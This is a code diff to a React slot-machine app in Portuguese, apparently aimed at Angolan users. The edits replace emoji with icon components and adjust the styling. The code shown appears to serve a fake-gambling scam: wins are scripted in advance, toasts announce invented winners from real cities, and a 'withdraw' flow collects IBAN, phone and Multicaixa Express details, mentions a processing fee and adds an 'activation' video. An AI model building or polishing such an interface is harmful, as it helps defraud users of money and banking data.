@@ -1,10 +1,28 @@
 import { useCallback, useEffect, useMemo, useRef, useState } from "react";
 import { AnimatePresence, motion } from "framer-motion";
+import {
+  ArrowLeftIcon,
+  ArrowPathIcon,
+  BanknotesIcon,
+  BoltIcon,
+  BuildingLibraryIcon,
+  CheckCircleIcon,
+  CurrencyDollarIcon,
+  FaceFrownIcon,
+  FireIcon,
+  GiftIcon,
+  PhoneIcon,
+  SparklesIcon,
+  StarIcon,
+  TrophyIcon,
+  UserIcon,
+} from "@heroicons/react/24/solid";
 import type { Amulet } from "./RitualScreen";
 import {
   COIN_IMAGE,
   DRAGON_BG,
   DRAGON_MASCOT,
+  MULTICAIXA_EXPRESS,
   SYMBOLS,
   CONVERTEAI_ACCOUNT,
   ACTIVATION_VIDEO_ID,
@@ -81,21 +99,21 @@ const FUTURE_GAINS = ROUNDS.map((r) => (r.win ? r.amount : 0));
 const SURPRISES = {
   3: {
     id: "dobrada",
-    emoji: "⚡",
+    Icon: BoltIcon,
     title: "RODADA DOBRADA",
     subtitle: "O que ganhares aqui vale a DOBRAR",
     bonus: 2,
   },
   6: {
     id: "dourada",
-    emoji: "👑",
+    Icon: StarIcon,
     title: "RODADA DOURADA",
     subtitle: "O dragão liberta o baú imperial — x3",
     bonus: 3,
   },
   9: {
     id: "relampago",
-    emoji: "🐉",
+    Icon: FireIcon,
     title: "DESAFIO RELÂMPAGO",
     subtitle: "Sopro do dragão: ganho x5 nesta rodada",
     bonus: 5,
@@ -230,7 +248,7 @@ function DragonDisplay({ state }: { state: DragonState }) {
           {[...Array(8)].map((_, i) => (
             <motion.div
               key={i}
-              className="absolute text-base"
+              className="absolute"
               style={{
                 left: `${10 + Math.random() * 80}%`,
                 top: `${5 + Math.random() * 90}%`,
@@ -247,7 +265,7 @@ function DragonDisplay({ state }: { state: DragonState }) {
                 repeatDelay: 0.2,
               }}
             >
-              ✨
+              <SparklesIcon className="w-4 h-4" style={{ color: "#FFE680" }} />
             </motion.div>
           ))}
         </div>
@@ -425,19 +443,21 @@ function WinModal({
                 WebkitBackgroundClip: "text",
                 WebkitTextFillColor: "transparent",
                 fontFamily: "'Russo One', sans-serif",
-                filter: "drop-shadow(0 0 10px rgba(255,200,80,0.6))",
+                filter: "drop-shadow(0 2px 0 rgba(0,0,0,0.45)) drop-shadow(0 0 4px rgba(255,200,80,0.45))",
               }}
               animate={isMega ? { scale: [1, 1.09, 1] } : {}}
               transition={{ duration: 0.5, repeat: Infinity }}
             >
-              🐉 {label} 🐉
+              <FireIcon className="inline-block w-6 h-6 align-[-2px]" style={{ color: "#FF8A00" }} />{" "}
+              {label}{" "}
+              <FireIcon className="inline-block w-6 h-6 align-[-2px]" style={{ color: "#FF8A00" }} />
             </motion.div>
             <motion.div
               className="font-bold text-3xl"
               style={{
                 color: "#7CFFB2",
                 fontFamily: "'Orbitron', sans-serif",
-                textShadow: "0 0 18px rgba(124,255,178,0.7)",
+                textShadow: "0 2px 0 rgba(0,0,0,0.45), 0 0 6px rgba(124,255,178,0.45)",
               }}
               initial={{ y: 15, opacity: 0 }}
               animate={{ y: 0, opacity: 1 }}
@@ -692,7 +712,7 @@ function MultiplierChips({
                 fontFamily: "'Orbitron', sans-serif",
                 textShadow: isActive
                   ? "none"
-                  : "0 0 8px rgba(190,120,255,0.8)",
+                  : "0 0 4px rgba(190,120,255,0.6)",
               }}
             >
               x{mult}
@@ -843,7 +863,7 @@ function BonusEndScreen({
           className="w-14 h-14 rounded-full flex items-center justify-center mx-auto mb-4"
           style={{ background: "rgba(60,50,30,0.6)" }}
         >
-          <span className="text-2xl">🎉</span>
+          <SparklesIcon className="w-7 h-7" style={{ color: "#FFD34D" }} />
         </div>
         <h2
           className="text-lg font-bold text-white mb-1"
@@ -894,7 +914,7 @@ function BonusEndScreen({
           }}
           whileTap={{ scale: 0.97 }}
         >
-          💰 Sacar
+          <span className="inline-flex items-center justify-center gap-2"><BanknotesIcon className="w-5 h-5" />Sacar</span>
         </motion.button>
       </motion.div>
     </div>
@@ -976,6 +996,11 @@ function ActivationScreen({ totalWin }: { totalWin: number }) {
     player.id = `vid-${ACTIVATION_VIDEO_ID}`;
     player.style.cssText =
       "display:block;margin:0 auto;width:100%;max-width:400px;";
+    const placeholder = document.createElement("div");
+    placeholder.className = "vturb-player-placeholder";
+    placeholder.style.cssText =
+      "position:relative;width:100%;padding:178.21782178217822% 0 0;z-index:0;background-color:black;";
+    player.appendChild(placeholder);
     container.appendChild(player);
     const script = document.createElement("script");
     script.type = "text/javascript";
@@ -1017,7 +1042,7 @@ function ActivationScreen({ totalWin }: { totalWin: number }) {
             exit={{ y: 80, opacity: 0 }}
             transition={{ type: "spring", stiffness: 300, damping: 25 }}
           >
-            <span className="text-lg">✅</span>
+            <CheckCircleIcon className="w-5 h-5 shrink-0" style={{ color: "#22C55E" }} />
             <p className="text-xs text-white">
               <strong>{winnerName}</strong>{" "}
               <span style={{ color: "#888" }}>levantou</span>{" "}
@@ -1152,7 +1177,7 @@ function WithdrawScreen({ totalWin }: { totalWin: number }) {
             className="w-14 h-14 rounded-full flex items-center justify-center mx-auto mb-3"
             style={{ background: "rgba(34,197,94,0.15)" }}
           >
-            <span className="text-2xl">✅</span>
+            <CheckCircleIcon className="w-8 h-8" style={{ color: "#22C55E" }} />
           </div>
           <h2
             className="text-lg font-bold mb-1"
@@ -1199,7 +1224,7 @@ function WithdrawScreen({ totalWin }: { totalWin: number }) {
                 className="flex items-center gap-2 text-xs"
                 style={{ color: "#ccc" }}
               >
-                <span>📱</span>
+                <img src={MULTICAIXA_EXPRESS} alt="Multicaixa Express" className="w-5 h-5 rounded object-contain" />
                 <span>
                   Express: <strong className="text-white">{expressNumber}</strong>
                 </span>
@@ -1210,21 +1235,21 @@ function WithdrawScreen({ totalWin }: { totalWin: number }) {
                   className="flex items-center gap-2 text-xs"
                   style={{ color: "#ccc" }}
                 >
-                  <span>👤</span>
+                  <UserIcon className="w-4 h-4 shrink-0" />
                   <span>{name}</span>
                 </div>
                 <div
                   className="flex items-center gap-2 text-xs"
                   style={{ color: "#ccc" }}
                 >
-                  <span>📞</span>
+                  <PhoneIcon className="w-4 h-4 shrink-0" />
                   <span>{phone}</span>
                 </div>
                 <div
                   className="flex items-center gap-2 text-xs"
                   style={{ color: "#ccc" }}
                 >
-                  <span>🏦</span>
+                  <BuildingLibraryIcon className="w-4 h-4 shrink-0" />
                   <span>IBAN: {iban}</span>
                 </div>
               </>
@@ -1240,7 +1265,7 @@ function WithdrawScreen({ totalWin }: { totalWin: number }) {
             }}
             whileTap={{ scale: 0.97 }}
           >
-            💰 Levantar meus ganhos agora
+            <span className="inline-flex items-center justify-center gap-2"><BanknotesIcon className="w-5 h-5" />Levantar meus ganhos agora</span>
           </motion.button>
         </motion.div>
       </div>
@@ -1250,7 +1275,13 @@ function WithdrawScreen({ totalWin }: { totalWin: number }) {
     const methods = [
       {
         id: "express",
-        emoji: "⚡",
+        icon: (
+          <img
+            src={MULTICAIXA_EXPRESS}
+            alt="Multicaixa Express"
+            className="w-12 h-12 rounded-lg object-contain"
+          />
+        ),
         title: "Multicaixa Express",
         reveal: "Receba pelo seu número Express",
         detail: "Taxa de processamento de 2%",
@@ -1259,7 +1290,9 @@ function WithdrawScreen({ totalWin }: { totalWin: number }) {
       },
       {
         id: "iban",
-        emoji: "🏦",
+        icon: (
+          <BuildingLibraryIcon className="w-10 h-10" style={{ color: "#FFD34D" }} />
+        ),
         title: "Transferência por IBAN",
         reveal: "Receba diretamente na sua conta bancária",
         detail: "Processamento em até 24 horas",
@@ -1333,7 +1366,7 @@ function WithdrawScreen({ totalWin }: { totalWin: number }) {
                   boxShadow: `0 0 16px ${m.glow}33`,
                 }}
               >
-                <div className="text-3xl mb-2">{m.emoji}</div>
+                <div className="mb-2 flex justify-center">{m.icon}</div>
                 <div
                   className="text-[12px] font-bold"
                   style={{ color: "#FFD34D" }}
@@ -1396,13 +1429,26 @@ function WithdrawScreen({ totalWin }: { totalWin: number }) {
           className="text-xs mb-3"
           style={{ color: "#888" }}
         >
-          ← Voltar
+          <span className="inline-flex items-center gap-1">
+            <ArrowLeftIcon className="w-3 h-3" /> Voltar
+          </span>
         </button>
         <h2
           className="text-lg font-bold text-white mb-5"
           style={{ fontFamily: "'Russo One', sans-serif" }}
         >
-          {method === "express" ? "Multicaixa Express" : "Registrar IBAN"}
+          {method === "express" ? (
+            <span className="flex items-center gap-2">
+              <img
+                src={MULTICAIXA_EXPRESS}
+                alt=""
+                className="w-8 h-8 rounded-md object-contain"
+              />
+              Multicaixa Express
+            </span>
+          ) : (
+            "Registrar IBAN"
+          )}
         </h2>
         {method === "express" ? (
           <div className="space-y-3">
@@ -1572,7 +1618,7 @@ function StreakBar({
             {flames.map((i) => (
               <motion.span
                 key={i}
-                className="text-[11px] sm:text-[13px]"
+                className="flex"
                 style={{
                   filter: i < streak ? "none" : "grayscale(1)",
                   opacity: i < streak ? 1 : 0.25,
@@ -1584,7 +1630,7 @@ function StreakBar({
                   delay: i * 0.12,
                 }}
               >
-                🔥
+                <FireIcon className="w-3 h-3 sm:w-3.5 sm:h-3.5" style={{ color: "#FF8A00" }} />
               </motion.span>
             ))}
           </div>
@@ -1630,9 +1676,10 @@ function StreakBar({
               transition={{ duration: 1.4, repeat: Infinity }}
             >
               {surprise && !done && (
-                <span className="absolute -top-[9px] left-1/2 -translate-x-1/2 text-[9px]">
-                  🎁
-                </span>
+                <GiftIcon
+                  className="absolute -top-[10px] left-1/2 -translate-x-1/2 w-2.5 h-2.5"
+                  style={{ color: "#FFD34D" }}
+                />
               )}
             </motion.div>
           );
@@ -1665,11 +1712,11 @@ function SurpriseOverlay({ surprise }: { surprise: typeof SURPRISES[3] | null })
             transition={{ type: "spring", stiffness: 260, damping: 16 }}
           >
             <motion.div
-              className="text-6xl mb-3"
+              className="mb-3 flex justify-center"
               animate={{ scale: [1, 1.2, 1], rotate: [0, 8, -8, 0] }}
               transition={{ duration: 1, repeat: Infinity }}
             >
-              {surprise.emoji}
+              <surprise.Icon className="w-16 h-16" style={{ color: "#FFD34D" }} />
             </motion.div>
             <motion.h3
               className="text-2xl font-bold"
@@ -1728,7 +1775,7 @@ const TOAST_CITIES = [
   "Uíge",
   "Namibe",
 ];
-const TOAST_AVATARS = ["🗡️", "🔮", "💰", "🛡️"];
+const TOAST_AVATARS = [TrophyIcon, SparklesIcon, BanknotesIcon, StarIcon];
 
 const newToast = () => ({
   id: Math.random().toString(36).slice(2),
@@ -1773,7 +1820,7 @@ function WinToast() {
             exit={{ x: -260, opacity: 0 }}
             transition={{ type: "spring", stiffness: 220, damping: 22 }}
           >
-            <span className="text-lg">{winner.avatar}</span>
+            <winner.avatar className="w-5 h-5 shrink-0" style={{ color: "#FFD34D" }} />
             <div className="leading-tight">
               <div className="text-[9px]" style={{ color: "#E6CCFF" }}>
                 <strong style={{ color: "#FFD34D" }}>{winner.name}</strong> ·{" "}
@@ -2402,7 +2449,7 @@ export default function SlotMachine({
             animate={{ x: [350, -640] }}
             transition={{ duration: 10, repeat: Infinity, ease: "linear" }}
           >
-            🐉 Fortune Dragon • O dragão está a pagar hoje! 🎰 Multiplicadores até 2500x 💰
+            Fortune Dragon • O dragão está a pagar hoje! • Multiplicadores até 2500x
           </motion.div>
         </div>
 
@@ -2418,7 +2465,7 @@ export default function SlotMachine({
               className="flex-1 text-center py-1 flex items-center justify-center gap-1"
               style={{ borderRight: "1px solid rgba(255,47,208,0.35)" }}
             >
-              <span className="text-sm">💰</span>
+              <BanknotesIcon className="w-4 h-4" style={{ color: "#FFD34D" }} />
               <div>
                 <div
                   className="text-[8px] uppercase tracking-wider"
@@ -2438,7 +2485,7 @@ export default function SlotMachine({
               className="flex-1 text-center py-1 flex items-center justify-center gap-1"
               style={{ borderRight: "1px solid rgba(255,47,208,0.35)" }}
             >
-              <span className="text-sm">🪙</span>
+              <CurrencyDollarIcon className="w-4 h-4" style={{ color: "#FFD34D" }} />
               <div>
                 <div
                   className="text-[8px] uppercase tracking-wider"
@@ -2455,7 +2502,7 @@ export default function SlotMachine({
               </div>
             </div>
             <div className="flex-1 text-center py-1 flex items-center justify-center gap-1">
-              <span className="text-sm">🏆</span>
+              <TrophyIcon className="w-4 h-4" style={{ color: "#FFD34D" }} />
               <div>
                 <div
                   className="text-[8px] uppercase tracking-wider"
@@ -2483,8 +2530,8 @@ export default function SlotMachine({
             transition={{ duration: 1, repeat: Infinity }}
           >
             {remainingSpins > 0
-              ? `⚡ Restam ${remainingSpins} giro${remainingSpins > 1 ? "s" : ""} grátis — não deixes o dragão esfriar!`
-              : "🔥 Giros terminados! Levanta os teus ganhos agora."}
+              ? `Restam ${remainingSpins} giro${remainingSpins > 1 ? "s" : ""} grátis — não deixes o dragão esfriar!`
+              : "Giros terminados! Levanta os teus ganhos agora."}
           </motion.span>
         </div>
 
@@ -2503,7 +2550,7 @@ export default function SlotMachine({
                 : "0 0 6px rgba(0,0,0,0.4)",
             }}
           >
-            <span className="text-lg">⚡</span>
+            <BoltIcon className="w-5 h-5" style={{ color: turbo ? "#2A0B4D" : "#FFD34D" }} />
             <span
               className="text-[7px] font-bold"
               style={{ color: turbo ? "#2A0B4D" : "#C58BFF" }}
@@ -2590,7 +2637,7 @@ export default function SlotMachine({
                 : "0 0 6px rgba(0,0,0,0.4)",
             }}
           >
-            <span className="text-lg">🔄</span>
+            <ArrowPathIcon className="w-5 h-5" style={{ color: auto ? "#2A0B4D" : "#FFD34D" }} />
             <span
               className="text-[7px] font-bold"
               style={{ color: auto ? "#2A0B4D" : "#C58BFF" }}
@@ -2626,7 +2673,7 @@ export default function SlotMachine({
             transition={{ duration: 1.2, repeat: Infinity }}
             whileTap={roundsPlayed >= 10 ? { scale: 0.97 } : {}}
           >
-            💰 LEVANTAR
+            <span className="inline-flex items-center justify-center gap-2"><BanknotesIcon className="w-5 h-5" />LEVANTAR</span>
           </motion.button>
         </div>
       </div>
@@ -2667,12 +2714,13 @@ export default function SlotMachine({
                 WebkitBackgroundClip: "text",
                 WebkitTextFillColor: "transparent",
                 fontFamily: "'Russo One', sans-serif",
-                textShadow: "0 0 20px rgba(255,40,40,0.6)",
+                filter: "drop-shadow(0 2px 0 rgba(0,0,0,0.5)) drop-shadow(0 0 4px rgba(255,40,40,0.5))",
               }}
               animate={{ opacity: [1, 0.7, 1] }}
               transition={{ duration: 0.9, repeat: Infinity }}
             >
-              💀 VOCÊ PERDEU
+              <FaceFrownIcon className="inline-block w-8 h-8 mr-1 align-[-4px]" style={{ color: "#FF4D4D" }} />
+              VOCÊ PERDEU
             </motion.span>
             <span
               className="block mt-1 text-[11px] font-bold"
